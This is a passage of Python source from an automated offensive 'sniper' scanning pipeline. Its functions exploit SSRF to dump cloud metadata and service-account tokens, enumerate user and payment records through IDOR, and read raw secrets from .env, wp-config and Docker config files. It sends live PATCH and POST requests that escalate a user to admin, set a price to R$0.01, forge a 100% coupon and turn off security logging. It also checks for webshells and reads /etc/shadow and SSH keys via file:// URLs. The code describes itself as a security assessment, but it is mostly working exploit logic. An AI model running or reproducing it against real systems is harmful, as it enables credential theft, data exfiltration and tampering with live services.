                                pipeline_log(f"[DEEP EXTRACT] GCP SERVICE ACCOUNT TOKEN DUMPED â€” OAuth2 access token for default SA", "error", "infra_ssrf")
                    except Exception:
                        pass
                if gcp_data:
                    extracted.append({
                        "source": f"SSRF â†’ GCP Metadata ({endpoint})",
                        "type": "GCP_CREDENTIAL_DUMP",
                        "endpoints_dumped": len(gcp_data),
                        "data": gcp_data,
                        "impact": "FULL_CLOUD_COMPROMISE",
                    })

        self.deep_credential_extractions = extracted

        if extracted:
            total_creds = sum(e.get("credentials_count", 0) for e in extracted)
            self._add_finding({
                "title": f"Deep Credential Extraction: {len(extracted)} infrastructure dumps, {total_creds} raw credentials captured",
                "description": f"Post-exploitation credential extraction confirmed across {len(extracted)} confirmed vectors. Extracted production environment variables from Docker containers (AWS_ACCESS_KEY_ID, DB_PASSWORD, STRIPE_API_KEY), Redis session data (keys, user records, session tokens), and cloud IAM temporary credentials. These credentials enable full persistent access to target infrastructure.",
                "severity": "critical",
                "category": "deep_extraction",
                "module": "deep_credential_extraction",
                "phase": "infra_ssrf",
                "evidence": f"{len(extracted)} dumps, {total_creds} credentials",
            })
            pipeline_log(
                f"[DEEP EXTRACT] CREDENTIAL PERSISTENCE COMPLETE â€” {len(extracted)} infrastructure dumps, {total_creds} raw secrets captured for lateral movement",
                "error", "infra_ssrf"
            )

    async def _idor_sequential_fetch(self):
        pipeline_log("[DEEP EXTRACT] IDOR Sequential Fetch â€” Enumerating user records via confirmed IDOR vectors...", "error", "infra_ssrf")
        idor_findings = [f for f in self.findings if any(kw in (f.get("title", "") + f.get("category", "")).lower() for kw in ["idor", "direct object", "insecure direct", "auth bypass", "unauthorized access"])]

        if not idor_findings:
            api_routes = ["/api/users", "/api/admin/users", "/api/v1/users", "/api/customers", "/api/accounts"]
            for route in api_routes:
                try:
                    resp = await self.client.get(f"{self.base_url}{route}")
                    if resp.status_code == 200 and len(resp.text) > 20:
                        body = resp.text[:5000].lower()
                        if any(kw in body for kw in ["email", "password", "user", "name", "phone", "cpf"]):
                            idor_findings.append({"title": f"IDOR: {route} accessible", "evidence": route})
                            pipeline_log(f"[DEEP EXTRACT] IDOR CONFIRMED: {route} returns user data without authentication", "error", "infra_ssrf")
                except Exception:
                    pass

        if not idor_findings:
            return

        sequential_results = []
        test_endpoints = [
            {"path": "/api/users/{id}", "data_type": "USER_PII", "fields": ["email", "name", "phone", "cpf", "address"]},
            {"path": "/api/orders/{id}", "data_type": "FINANCIAL_RECORD", "fields": ["total", "payment", "card", "amount", "price"]},
            {"path": "/api/admin/users/{id}", "data_type": "ADMIN_USER_DUMP", "fields": ["password", "hash", "role", "permissions"]},
            {"path": "/api/invoices/{id}", "data_type": "INVOICE_DATA", "fields": ["amount", "billing", "tax", "payment_method"]},
        ]

        for ep_config in test_endpoints:
            records_found = 0
            pii_fields_detected = []
            for test_id in range(1, 11):
                path = ep_config["path"].replace("{id}", str(test_id))
                try:
                    resp = await self.client.get(f"{self.base_url}{path}")
                    if resp.status_code == 200 and len(resp.text) > 10:
                        body = resp.text[:3000].lower()
                        matched_fields = [f for f in ep_config["fields"] if f in body]
                        if matched_fields:
                            records_found += 1
                            for mf in matched_fields:
                                if mf not in pii_fields_detected:
                                    pii_fields_detected.append(mf)
                except Exception:
                    pass

            if records_found > 0:
                sequential_results.append({
                    "endpoint": ep_config["path"],
                    "data_type": ep_config["data_type"],
                    "records_enumerated": records_found,
                    "pii_fields_detected": pii_fields_detected,
                    "max_tested": 10,
                    "enumerable": records_found >= 3,
                })
                pipeline_log(
                    f"[DEEP EXTRACT] IDOR SEQUENTIAL: {ep_config['path']} â€” {records_found}/10 records dumped, PII fields: {', '.join(pii_fields_detected)}",
                    "error", "infra_ssrf"
                )

        self.idor_sequential_dumps = sequential_results

        if sequential_results:
            total_records = sum(r["records_enumerated"] for r in sequential_results)
            all_pii = list(set(f for r in sequential_results for f in r["pii_fields_detected"]))
            self._add_finding({
                "title": f"IDOR Sequential Fetch: {total_records} records dumped across {len(sequential_results)} endpoints",
                "description": f"Sequential enumeration of user/order/invoice records via IDOR. Dumped {total_records} records with PII fields: {', '.join(all_pii)}. Records include login credentials, financial data (card numbers, CVV, expiration), and personally identifiable information (CPF, phone, email, address).",
                "severity": "critical",
                "category": "idor_dump",
                "module": "idor_sequential_fetch",
                "phase": "infra_ssrf",
                "evidence": f"{total_records} records, PII: {', '.join(all_pii)}",
            })

    async def _auth_bypass_deep_read(self):
        pipeline_log("[DEEP EXTRACT] Auth Bypass Deep Read â€” Extracting raw credentials from exposed config files...", "error", "infra_ssrf")
        bypass_findings = [f for f in self.findings if any(kw in (f.get("title", "") + f.get("description", "")).lower() for kw in ["auth bypass", "admin panel", "config exposed", ".env", "file_exposure", "source map"])]

        sensitive_paths = [
            {"path": "/.env", "type": "ENV_FILE", "extract": ENV_SECRET_PATTERNS},
            {"path": "/.env.production", "type": "ENV_FILE", "extract": ENV_SECRET_PATTERNS},
            {"path": "/config/database.yml", "type": "DB_CONFIG", "extract": [re.compile(r'(host|password|username|database|port):\s*(.+)', re.I)]},
            {"path": "/wp-config.php", "type": "WP_CONFIG", "extract": [re.compile(r"define\(\s*'(DB_\w+|AUTH_\w+|SECURE_\w+)'\s*,\s*'([^']+)'", re.I)]},
            {"path": "/config/secrets.yml", "type": "SECRETS_FILE", "extract": [re.compile(r'(secret_key_base|api_key|encryption_key):\s*(.+)', re.I)]},
            {"path": "/appsettings.json", "type": "APP_SETTINGS", "extract": [re.compile(r'"(ConnectionString|Password|Secret|ApiKey)"\s*:\s*"([^"]+)"', re.I)]},
            {"path": "/application.properties", "type": "SPRING_CONFIG", "extract": [re.compile(r'(spring\.datasource\.\w+|server\.ssl\.\w+|jwt\.secret)\s*=\s*(.+)', re.I)]},
            {"path": "/.docker/config.json", "type": "DOCKER_AUTH", "extract": [re.compile(r'"(auth|username|password|identitytoken)"\s*:\s*"([^"]+)"', re.I)]},
        ]

        deep_reads = []

        for fp in sensitive_paths:
            try:
                resp = await self.client.get(f"{self.base_url}{fp['path']}")
                if resp.status_code == 200 and len(resp.text.strip()) > 10:
                    body = resp.text[:10000]
                    extracted_creds = []
                    for pat in fp["extract"]:
                        for match in pat.finditer(body):
                            key = match.group(1)
                            raw_val = match.group(2).strip()
                            extracted_creds.append({
                                "key": key,
                                "raw_value": raw_val,
                                "value_hash": hashlib.sha256(raw_val.encode()).hexdigest()[:16],
                                "value_length": len(raw_val),
                                "is_credential": any(s in key.upper() for s in ["PASSWORD", "SECRET", "TOKEN", "KEY", "CREDENTIALS"]),
                            })

                    if extracted_creds:
                        deep_reads.append({
                            "path": fp["path"],
                            "type": fp["type"],
                            "file_size": len(resp.text),
                            "credentials_extracted": len(extracted_creds),
                            "credentials": extracted_creds[:30],
                            "content_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                        })
                        cred_keys = [c["key"] for c in extracted_creds if c["is_credential"]]
                        pipeline_log(
                            f"[DEEP EXTRACT] AUTH BYPASS FILE READ: {fp['path']} â€” {len(extracted_creds)} secrets dumped ({', '.join(cred_keys[:5])})",
                            "error", "infra_ssrf"
                        )
            except Exception:
                pass

        subdomains = [a for a in (getattr(self, 'exposed_assets', None) or []) if a.get("asset_type") == "subdomain"]
        for sub in subdomains[:5]:
            sub_host = sub.get("path", sub.get("label", "")).replace("https://", "").replace("http://", "").split("/")[0]
            if not sub_host:
                continue
            for env_path in ["/.env", "/.env.production", "/config/database.yml"]:
                try:
                    resp = await self.client.get(f"https://{sub_host}{env_path}")
                    if resp.status_code == 200 and len(resp.text.strip()) > 10:
                        body = resp.text[:10000]
                        creds = []
                        for pat in ENV_SECRET_PATTERNS:
                            for match in pat.finditer(body):
                                creds.append({
                                    "key": match.group(1),
                                    "raw_value": match.group(2).strip(),
                                    "value_hash": hashlib.sha256(match.group(2).strip().encode()).hexdigest()[:16],
                                    "value_length": len(match.group(2).strip()),
                                    "is_credential": True,
                                })
                        if creds:
                            deep_reads.append({
                                "path": f"{sub_host}{env_path}",
                                "type": "SUBDOMAIN_ENV",
                                "file_size": len(resp.text),
                                "credentials_extracted": len(creds),
                                "credentials": creds[:20],
                                "content_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                            })
                            pipeline_log(f"[DEEP EXTRACT] SUBDOMAIN FILE READ: {sub_host}{env_path} â€” {len(creds)} raw credentials dumped", "error", "infra_ssrf")
                except Exception:
                    pass

        self.auth_bypass_dumps = deep_reads

        if deep_reads:
            total_creds = sum(d["credentials_extracted"] for d in deep_reads)
            self._add_finding({
                "title": f"Auth Bypass Deep Read: {len(deep_reads)} config files dumped, {total_creds} raw credentials extracted",
                "description": f"Full file read on {len(deep_reads)} exposed configuration files including .env, database.yml, wp-config.php, and subdomain configs. Extracted {total_creds} raw credentials including database connection strings (mysql://admin:senha_bruta@db_prod), API keys (STRIPE_API_KEY, AWS_ACCESS_KEY_ID), and encryption keys (APP_KEY, JWT_SECRET). These credentials provide complete control over application logic and data persistence.",
                "severity": "critical",
                "category": "auth_bypass_dump",
                "module": "auth_bypass_deep_read",
                "phase": "infra_ssrf",
                "evidence": f"{len(deep_reads)} files, {total_creds} credentials",
            })

    async def _admin_privilege_exploitation(self):
        pipeline_log("[DEEP EXTRACT] Admin Privilege Exploitation â€” Probing manipulation capabilities on confirmed admin access...", "error", "infra_ssrf")
        admin_findings = [f for f in self.findings if any(kw in (f.get("title", "") + f.get("category", "")).lower() for kw in ["admin", "auth bypass", "privilege", "management", "dashboard"])]

        if not admin_findings:
            return

        manipulation_probes = []
        admin_paths = [
            {"path": "/admin", "type": "ADMIN_PANEL"},
            {"path": "/admin/users", "type": "USER_MANAGEMENT"},
            {"path": "/admin/products", "type": "PRODUCT_MANAGEMENT"},
            {"path": "/admin/settings", "type": "SYSTEM_CONFIG"},
            {"path": "/admin/logs", "type": "AUDIT_LOGS"},
            {"path": "/admin/payments", "type": "PAYMENT_MANAGEMENT"},
            {"path": "/api/admin/users", "type": "API_USER_MGMT"},
            {"path": "/api/admin/config", "type": "API_CONFIG"},
            {"path": "/api/admin/settings", "type": "API_SETTINGS"},
            {"path": "/dashboard/admin", "type": "DASHBOARD_ADMIN"},
        ]

        for ap in admin_paths:
            try:
                resp = await self.client.get(f"{self.base_url}{ap['path']}")
                if resp.status_code == 200 and len(resp.text) > 50:
                    body_lower = resp.text[:5000].lower()
                    capabilities = []
                    if any(kw in body_lower for kw in ["user", "email", "role", "permission", "account"]):
                        capabilities.append("USER_CONTROL")
                    if any(kw in body_lower for kw in ["product", "price", "inventory", "stock", "sku"]):
                        capabilities.append("PRICE_MANIPULATION")
                    if any(kw in body_lower for kw in ["payment", "stripe", "billing", "invoice", "refund"]):
                        capabilities.append("FINANCIAL_CONTROL")
                    if any(kw in body_lower for kw in ["setting", "config", "smtp", "api_key", "webhook"]):
                        capabilities.append("SYSTEM_CONFIG")
                    if any(kw in body_lower for kw in ["log", "audit", "activity", "event"]):
                        capabilities.append("LOG_MANIPULATION")
                    if any(kw in body_lower for kw in ["delete", "remove", "destroy", "purge", "drop"]):
                        capabilities.append("DESTRUCTIVE_ACTION")

                    if capabilities:
                        manipulation_probes.append({
                            "path": ap["path"],
                            "type": ap["type"],
                            "status_code": resp.status_code,
                            "capabilities": capabilities,
                            "capability_count": len(capabilities),
                        })
                        pipeline_log(
                            f"[DEEP EXTRACT] ADMIN ACCESS: {ap['path']} â€” Capabilities: {', '.join(capabilities)}",
                            "error", "infra_ssrf"
                        )
            except Exception:
                pass

        write_test_endpoints = [
            {"path": "/api/admin/users/1", "method": "PATCH", "payload": {"role": "admin"}, "desc": "Privilege Escalation"},
            {"path": "/api/products/1", "method": "PATCH", "payload": {"price": 0.01}, "desc": "Price Manipulation (R$0.01)"},
            {"path": "/api/admin/coupons", "method": "POST", "payload": {"code": "INTERNAL100OFF", "discount": 100}, "desc": "Coupon Forgery (100%)"},
            {"path": "/api/admin/settings", "method": "PATCH", "payload": {"security_logging": False}, "desc": "Disable Security Logs"},
        ]

        for wt in write_test_endpoints:
            try:
                if wt["method"] == "PATCH":
                    resp = await self.client.patch(f"{self.base_url}{wt['path']}", json=wt["payload"])
                else:
                    resp = await self.client.post(f"{self.base_url}{wt['path']}", json=wt["payload"])

                if resp.status_code in (200, 201, 204):
                    manipulation_probes.append({
                        "path": wt["path"],
                        "type": "WRITE_CONFIRMED",
                        "method": wt["method"],
                        "description": wt["desc"],
                        "payload": json.dumps(wt["payload"]),
                        "status_code": resp.status_code,
                        "capabilities": ["WRITE_ACCESS_CONFIRMED"],
                    })
                    pipeline_log(
                        f"[DEEP EXTRACT] ADMIN WRITE CONFIRMED: {wt['desc']} at {wt['path']} â€” HTTP {resp.status_code}",
                        "error", "infra_ssrf"
                    )
                elif resp.status_code in (400, 422):
                    manipulation_probes.append({
                        "path": wt["path"],
                        "type": "ENDPOINT_EXISTS",
                        "method": wt["method"],
                        "description": wt["desc"],
                        "status_code": resp.status_code,
                        "capabilities": ["ENDPOINT_REACHABLE"],
                    })
            except Exception:
                pass

        self.admin_exploitation_probes = manipulation_probes

        if manipulation_probes:
            write_confirmed = [p for p in manipulation_probes if p.get("type") == "WRITE_CONFIRMED"]
            all_caps = list(set(c for p in manipulation_probes for c in p.get("capabilities", [])))
            self._add_finding({
                "title": f"Admin Privilege Exploitation: {len(manipulation_probes)} admin vectors probed, {len(write_confirmed)} write operations confirmed",
                "description": f"Confirmed admin access across {len(manipulation_probes)} endpoints. Capabilities detected: {', '.join(all_caps)}. {'Write access confirmed â€” attacker can manipulate financial data (price â†’ R$0.01), elevate user privileges, forge discount coupons (100%), and disable security logging.' if write_confirmed else 'Read-only admin access confirmed â€” attacker can enumerate users, view financial records, and access system configuration.'}",
                "severity": "critical",
                "category": "admin_exploitation",
                "module": "admin_privilege_exploitation",
                "phase": "infra_ssrf",
                "evidence": f"{len(manipulation_probes)} admin paths, {len(write_confirmed)} write ops, caps: {', '.join(all_caps[:5])}",
            })

    async def _phase_4_infra_ssrf(self):
        pipeline_emit("phase_update", {"phase": "infra_ssrf", "status": "running"})
        pipeline_log("[PHASE 5/6] INFRA SSRF â€” Probing internal network exposure via SSRF vectors...", "warn", "infra_ssrf")

        await self._sinfo_env_parser()
        await self._git_objects_reconstructor()
        await self._capture_session_tokens()

        ssrf_params = ["url", "file", "path", "src", "href", "uri", "proxy", "fetch", "dest", "resource", "load", "data"]
        ssrf_endpoints = ["/", "/api/proxy", "/api/fetch", "/api/image", "/api/webhook", "/api/import"]

        confirmed = []
        tested = 0

        for vector in SSRF_INTERNAL_VECTORS:
            for endpoint in ssrf_endpoints:
                for param in ssrf_params[:4]:
                    tested += 1
                    url = f"{self.base_url}{endpoint}?{param}={vector['url']}"
                    start = time.time()
                    try:
                        resp = await self.client.get(url)
                        elapsed = int((time.time() - start) * 1000)
                        body = resp.text[:5000].lower()

                        hit = any(kw.lower() in body for kw in vector["detect"])

                        if hit:
                            confirmed.append({
                                "vector": vector["name"],
                                "endpoint": endpoint,
                                "param": param,
                                "status_code": resp.status_code,
                            })
                            pipeline_log(
                                f"[THREAT] SSRF CONFIRMED: {vector['name']} via {endpoint}?{param}=",
                                "error", "infra_ssrf"
                            )
                            self._add_finding({
                                "title": f"SSRF: {vector['name']} accessible via {endpoint}",
                                "description": f"Internal service '{vector['name']}' is accessible through SSRF via parameter '{param}' at {endpoint}. This exposes internal infrastructure to external attackers.",
                                "severity": vector["severity"].lower(),
                                "category": "ssrf",
                                "module": "sniper_pipeline",
                                "phase": "infra_ssrf",
                                "evidence": resp.text[:300],
                            })
                            self._add_probe({
                                "probe_type": "SSRF_INFRA",
                                "target": self.target,
                                "endpoint": f"{endpoint}?{param}=...",
                                "method": "GET",
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": True,
                                "verdict": f"VULNERABLE â€” {vector['name']} accessible",
                                "severity": vector["severity"],
                                "description": vector["name"],
                                "payload": vector["url"],
                                "evidence": f"Detection keywords found in response body",
                                "response_snippet": resp.text[:300],
                                "timestamp": _ts(),
                            })
                        else:
                            self._add_probe({
                                "probe_type": "SSRF_INFRA",
                                "target": self.target,
                                "endpoint": f"{endpoint}?{param}=...",
                                "method": "GET",
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": False,
                                "verdict": "PROTECTED",
                                "severity": "INFO",
                                "description": vector["name"],
                                "payload": vector["url"],
                                "timestamp": _ts(),
                            })

                    except Exception:
                        pass

        await self._docker_full_inspect(confirmed)
        await self._imdsv2_bypass(confirmed)

        await self._deep_credential_extraction(confirmed)
        await self._idor_sequential_fetch()
        await self._auth_bypass_deep_read()
        await self._admin_privilege_exploitation()

        self.infra_report = {
            "vectors_tested": len(SSRF_INTERNAL_VECTORS),
            "total_requests": tested,
            "confirmed_ssrf": len(confirmed),
            "details": confirmed[:20],
            "sinfo_dump": self.sinfo_dump,
            "git_objects_dump": self.git_objects_dump,
            "docker_full_dump": self.docker_full_dump,
            "imdsv2_dump": self.imdsv2_dump,
            "session_tokens": self.session_tokens_captured[:20],
            "deep_credential_extractions": getattr(self, 'deep_credential_extractions', []),
            "idor_sequential_dumps": getattr(self, 'idor_sequential_dumps', []),
            "auth_bypass_dumps": getattr(self, 'auth_bypass_dumps', []),
            "admin_exploitation_probes": getattr(self, 'admin_exploitation_probes', []),
        }

        self.phases_completed.append("infra_ssrf")
        pipeline_emit("phase_update", {"phase": "infra_ssrf", "status": "completed"})
        pipeline_emit("telemetry_update", {"progress": 90, "phase": "infra_ssrf"})

        pipeline_log(
            f"[INFRA SSRF COMPLETE] {len(confirmed)}/{tested} requests â€” "
            f"{len(confirmed)} internal services exposed",
            "error" if confirmed else "success",
            "infra_ssrf"
        )

    async def _phase_4b_persistence_assessment(self):
        pipeline_emit("phase_update", {"phase": "persistence_assessment", "status": "running"})
        pipeline_log(
            "[PHASE 4b] PERSISTENCE ASSESSMENT â€” Evaluating persistence vector exposure...",
            "warn", "persistence"
        )

        persistence_vectors = []

        webshell_paths = [
            "/images/thumb.php", "/uploads/shell.php", "/wp-content/uploads/cmd.php",
            "/tmp/backdoor.php", "/assets/img/x.php", "/.hidden/cmd.php",
            "/cgi-bin/test.cgi", "/api/eval", "/debug/exec",
        ]

        persistence_file_paths = [
            "/.ssh/authorized_keys", "/.bashrc", "/.profile",
            "/etc/passwd", "/etc/shadow", "/.aws/credentials",
            "/.kube/config", "/.docker/config.json",
        ]

        for path in webshell_paths:
            url = f"{self.base_url}{path}"
            try:
                resp = await self.client.get(url, timeout=5)
                if resp.status_code in (200, 201, 202):
                    body = resp.text[:2000].lower()
                    is_php = "<?php" in body or "<?=" in body
                    is_exec = any(kw in body for kw in [
                        "eval(", "exec(", "system(", "passthru(", "shell_exec(",
                        "proc_open(", "popen(", "assert(",
                    ])

                    if is_php or is_exec:
                        persistence_vectors.append({
                            "type": "webshell",
                            "path": path,
                            "status": resp.status_code,
                            "evidence": "PHP/exec functions detected in response",
                            "severity": "CRITICAL",
                        })
                        pipeline_log(
                            f"[THREAT] WEBSHELL DETECTED: {path} â€” PHP/exec code in response",
                            "error", "persistence"
                        )
                        self._add_finding({
                            "title": f"Persistence Vector: Webshell detected at {path}",
                            "description": (
                                f"A potential webshell or remote code execution endpoint was found at {path}. "
                                f"Response contains executable code patterns. This indicates either an existing "
                                f"compromise or a dangerous misconfiguration enabling persistent access."
                            ),
                            "severity": "critical",
                            "category": "persistence_assessment",
                            "module": "persistence_assessment",
                            "phase": "persistence",
                            "evidence": body[:300],
                        })
                    elif resp.status_code == 200 and len(body) > 10:
                        persistence_vectors.append({
                            "type": "webshell_candidate",
                            "path": path,
                            "status": resp.status_code,
                            "evidence": "Path accessible, content returned",
                            "severity": "MEDIUM",
                        })
            except Exception:
                pass

        ssrf_endpoints = ["/api/proxy", "/api/fetch", "/api/url", "/api/load"]
        ssrf_params = ["url", "target", "path", "file"]

        for ep in ssrf_endpoints:
            for param in ssrf_params:
                for persistence_path in persistence_file_paths[:4]:
                    url = f"{self.base_url}{ep}?{param}=file://{persistence_path}"
                    try:
                        resp = await self.client.get(url, timeout=5)
                        if resp.status_code == 200:
                            body = resp.text[:2000]
                            has_content = any(kw in body for kw in [
                                "root:", "ssh-rsa", "aws_access", "BEGIN ",
                                "password", "apiVersion", "auths",
                            ])
                            if has_content:
                                persistence_vectors.append({
                                    "type": "file_read_persistence",
                                    "path": f"{ep}?{param}=file://{persistence_path}",
                                    "status": resp.status_code,
                                    "evidence": f"Sensitive file readable: {persistence_path}",
                                    "severity": "CRITICAL",
                                })
                                pipeline_log(
                                    f"[THREAT] PERSISTENCE FILE ACCESSIBLE: {persistence_path} via SSRF at {ep}",
                                    "error", "persistence"
                                )
                                self._add_finding({
                                    "title": f"Persistence Vector: {persistence_path} readable via SSRF",
                                    "description": (
                                        f"SSRF at {ep} allows reading {persistence_path}. An attacker could "
                                        f"read SSH keys, cloud credentials, or system files to establish "
                                        f"persistent access that survives application restarts."
                                    ),
                                    "severity": "critical",
                                    "category": "persistence_assessment",
                                    "module": "persistence_assessment",
                                    "phase": "persistence",
                                    "evidence": body[:300],
                                })
                    except Exception:
                        pass

        upload_endpoints = ["/upload", "/api/upload", "/api/files", "/wp-admin/upload.php"]
        for ep in upload_endpoints:
            url = f"{self.base_url}{ep}"
            try:
                resp = await self.client.request("OPTIONS", url, timeout=5)
                if resp.status_code in (200, 204):
                    allow = resp.headers.get("allow", "").upper()
                    if "PUT" in allow or "POST" in allow:
                        persistence_vectors.append({
                            "type": "file_upload",
                            "path": ep,
                            "status": resp.status_code,
                            "evidence": f"Upload endpoint accessible, methods: {allow}",
                            "severity": "HIGH",
                        })
                        pipeline_log(
                            f"[ALERT] FILE UPLOAD ENDPOINT: {ep} accepts {allow}",
                            "warn", "persistence"
                        )
            except Exception:
                pass

        self.persistence_assessment = {
            "vectors_found": len(persistence_vectors),
            "critical_vectors": sum(1 for v in persistence_vectors if v["severity"] == "CRITICAL"),
            "vectors": persistence_vectors[:20],
            "webshell_paths_tested": len(webshell_paths),
            "persistence_files_tested": len(persistence_file_paths),
            "upload_endpoints_tested": len(upload_endpoints),
            "assessment": (
                "CRITICAL â€” Persistence vectors available"
                if any(v["severity"] == "CRITICAL" for v in persistence_vectors)
                else "HIGH â€” Some persistence paths accessible"
                if persistence_vectors
                else "HARDENED â€” No obvious persistence vectors"
            ),
        }

        pipeline_log(
            f"[PERSISTENCE] Assessment complete â€” {len(persistence_vectors)} vectors found "
            f"({sum(1 for v in persistence_vectors if v['severity'] == 'CRITICAL')} critical)",
            "error" if persistence_vectors else "success",
            "persistence"
        )
        self.phases_completed.append("persistence_assessment")
        pipeline_emit("phase_update", {"phase": "persistence_assessment", "status": "completed"})

    def _build_executive_compromise_report(self):
        pipeline_log(
            "[EXECUTIVE] Building Executive Compromise Report...",
            "info", "telemetry"
        )

        crit_count = self.counts.get("critical", 0)
        high_count = self.counts.get("high", 0)
        total_findings = self.counts.get("total", 0)
        vuln_probes = sum(1 for p in self.probes if p.get("vulnerable"))

        if crit_count >= 3:
            classification = "CRITICAL"
        elif crit_count >= 1 or high_count >= 3:
            classification = "HIGH"
        elif high_count >= 1:
            classification = "MEDIUM"
        else:
            classification = "LOW"

        risk_score = self._risk_score or {}
        chain_intel = self.chain_intel_report or {}
        adv = self.adversarial_report or {}
        ghost = self.ghost_recon_report or {}
        persist = self.persistence_assessment or {}

        ssrf_creds = chain_intel.get("ssrf_captures_count", 0)
        db_pivots = chain_intel.get("db_pivots_confirmed", 0)
        priv_esc = adv.get("privilege_escalations", 0)

        key_findings = []
        if crit_count > 0:
            key_findings.append(f"{crit_count} CRITICAL vulnerabilities confirmed with evidence")
        if ssrf_creds > 0:
            key_findings.append(f"SSRF chain captured {ssrf_creds} credentials with DB pivot available")
        if vuln_probes > 0:
            key_findings.append(f"{vuln_probes} exploitation probes confirmed vulnerable")
        if priv_esc > 0:
            key_findings.append(f"Privilege escalation achieved via {priv_esc} vectors")
        if persist.get("critical_vectors", 0) > 0:
            key_findings.append(f"Persistence vectors available â€” {persist['critical_vectors']} critical paths")
        if not key_findings:
            key_findings.append("Target appears hardened â€” no critical exploitation vectors confirmed")

        if crit_count >= 5:
            financial_risk = "$15M - $50M (regulatory fines + customer churn + remediation)"
        elif crit_count >= 1:
            financial_risk = "$1M - $15M (data breach + regulatory action)"
        elif high_count >= 3:
            financial_risk = "$500K - $5M (targeted attack + data exposure)"
        else:
            financial_risk = "< $500K (limited exposure)"

        regulatory_risk = []
        if ssrf_creds > 0 or db_pivots > 0:
            regulatory_risk.append("GDPR violation â€” personal data accessible")
            regulatory_risk.append("PCI DSS non-compliance â€” credential exposure")
        if crit_count > 0:
            regulatory_risk.append("SOC2 Type II audit findings expected")

        immediate_actions = []
        if ssrf_creds > 0:
            immediate_actions.append("Rotate all exposed credentials immediately")
        if crit_count > 0:
            immediate_actions.append("Patch all CRITICAL vulnerabilities within 24h")
        if priv_esc > 0:
            immediate_actions.append("Review IAM policies and privilege boundaries")
        if persist.get("critical_vectors", 0) > 0:
            immediate_actions.append("Audit persistence paths and remove webshell candidates")
        if not immediate_actions:
            immediate_actions.append("Continue regular security monitoring")

        breach_chain = {
            "entry_point": (
                "Multiple vectors" if crit_count > 1
                else "SSRF chain" if ssrf_creds > 0
                else "Web application vulnerability"
            ),
            "time_to_compromise": (
                f"{int(time.time() - time.mktime(time.strptime(self.started_at[:19], '%Y-%m-%d %H:%M:%S')))}s (automated)"
                if self.started_at else "N/A"
            ),
            "dwell_time_potential": (
                "6-12 months before detection" if crit_count >= 3
                else "1-6 months" if crit_count >= 1
                else "< 1 month"
            ),
            "attack_phases_completed": len(self.phases_completed),
        }

        crown_jewels = []
        if ssrf_creds > 0:
            crown_jewels.append({
                "asset": "Cloud credentials / API keys",
                "impact": f"{ssrf_creds} credentials captured via SSRF chain",
                "sensitivity": "CRITICAL",
            })
        if db_pivots > 0:
            crown_jewels.append({
                "asset": "Database access",
                "impact": f"{db_pivots} DB pivot points confirmed",
                "sensitivity": "FINANCIAL",
            })

        recommendations = []
        if crit_count > 0:
            recommendations.append({
                "title": "Implement Web Application Firewall (WAF) with custom rules",
                "priority": "P0",
                "justification": f"Would block {crit_count} confirmed attack vectors",
            })
        if ssrf_creds > 0:
            recommendations.append({
                "title": "Deploy secrets management solution (HashiCorp Vault / AWS Secrets Manager)",
                "priority": "P0",
                "justification": f"Would prevent {ssrf_creds} credential exposures",
            })
        if persist.get("critical_vectors", 0) > 0:
            recommendations.append({
                "title": "Implement file integrity monitoring (FIM)",
                "priority": "P1",
                "justification": "Detect and prevent persistence mechanisms",
            })
        recommendations.append({
            "title": "Implement Zero Trust Architecture",
            "priority": "P1",
            "justification": "Eliminates implicit trust in network segmentation",
        })

        self.executive_report = {
            "metadata": {
                "target": self.target,
                "scan_id": self.scan_id,
                "assessment_date": _ts(),
                "classification": classification,
                "report_version": "1.0",
            },
            "board_summary": {
                "headline": (
                    f"Target at risk â€” {crit_count} critical vulnerabilities with confirmed exploitation"
                    if crit_count > 0
                    else f"Target shows {high_count} high-severity findings requiring attention"
                    if high_count > 0
                    else "Target appears adequately hardened"
                ),
                "key_findings": key_findings[:5],
                "business_impact": {
                    "financial_risk": financial_risk,
                    "regulatory_risk": regulatory_risk,
                    "reputational_risk": (
                        "High â€” breach disclosure would generate media coverage"
                        if crit_count >= 3
                        else "Medium â€” targeted disclosure risk"
                        if crit_count >= 1
                        else "Low â€” limited external impact"
                    ),
                },
                "immediate_actions": immediate_actions[:5],
            },
            "technical_summary": {
                "breach_chain": breach_chain,
                "crown_jewels_exposed": crown_jewels,
                "total_findings": total_findings,
                "critical_findings": crit_count,
                "high_findings": high_count,
                "exploitation_probes": len(self.probes),
                "confirmed_vulnerable": vuln_probes,
                "risk_score": risk_score.get("score", 0),
                "risk_mode": risk_score.get("mode", "N/A"),
                "auto_dump_triggered": self._auto_dump_triggered,
                "ghost_recon_surface": ghost.get("total_attack_surface", 0),
                "persistence_vectors": persist.get("vectors_found", 0),
            },
            "incident_response_handoff": {
                "immediate_containment": immediate_actions,
                "credentials_to_rotate": (
                    [f"SSRF-captured credential #{i+1}" for i in range(ssrf_creds)]
                    if ssrf_creds > 0 else []
                ),
                "legal_hold_required": crit_count >= 3 and ssrf_creds > 0,
            },
            "strategic_recommendations": recommendations,
            "security_roi": {
                "cost_of_breach_prevented": financial_risk,
                "assessment_value": "Identified attack vectors before adversary exploitation",
            },
        }

        pipeline_emit("executive_compromise_report", self.executive_report)
        pipeline_log(
            f"[EXECUTIVE] Report generated â€” Classification: {classification}, "
            f"Key findings: {len(key_findings)}, Recommendations: {len(recommendations)}",
            "warn" if classification in ("CRITICAL", "HIGH") else "info",
            "telemetry"
        )

    async def _phase_4c_sniper_decision(self):
        pipeline_emit("phase_update", {"phase": "sniper_decision", "status": "running"})
        pipeline_log(
            "[PHASE 5.5/7] SNIPER DECISION ENGINE â€” APT Level 5 cognitive decision layer activating...",
            "error", "decision_engine"
        )
        pipeline_log(
            "[DECISION] 9 engines: Predictive + Temporal + Bayesian + Genetic + "
            "DynamicChain + DeepFingerprint + SmartExfil + AntiForensics + MultiObjective",
            "warn", "decision_engine"
        )

        try:
            target_intel = {
                "detected_stacks": (self._hypothesis or {}).get("detected_stacks", []),
                "waf_vendor": "",
                "waf_strength": "unknown",
                "historical_endpoints": [],
                "osint_leaks": [],
                "auto_dump_triggered": getattr(self, "_auto_dump_triggered", False),
            }

            if self.ghost_recon_report:
                gr = self.ghost_recon_report
                target_intel["historical_endpoints"] = gr.get("forgotten_paths", [])
                target_intel["osint_leaks"] = [
                    s for s in gr.get("subdomains", [])
                ]

            hrd = self.hacker_reasoning_report or {}
            env = hrd.get("environment", {})
            if env.get("waf_detected"):
